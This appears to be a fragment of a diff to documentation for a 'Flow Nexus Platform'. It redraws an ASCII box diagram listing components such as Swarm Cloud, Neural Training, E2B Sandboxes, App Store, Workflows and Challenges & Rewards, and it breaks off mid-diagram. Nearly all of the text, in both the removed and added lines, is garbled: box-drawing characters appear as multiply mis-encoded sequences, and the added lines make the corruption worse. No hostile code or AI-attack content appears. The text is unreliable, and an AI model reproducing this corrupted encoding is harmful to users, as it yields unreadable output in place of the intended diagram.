-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                      FLOW NEXUS PLATFORM                            ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€œÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¤
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                                     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â  ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â  ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   Swarm     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   Neural    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Sandboxes  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   Cloud     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   Training  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   (E2B)     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡             ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡             ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡             ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Scale to    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Distributed ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Isolated    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ 100+ agents ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ GPU trainingÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ code exec   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                                     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â  ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â  ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   App       ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Workflows  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Challenges  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   Store     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  (Events)   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ & Rewards   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡             ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡             ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡             ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Publish &   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Event-drivenÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Gamified    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ discover    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ automation  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ learning    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“  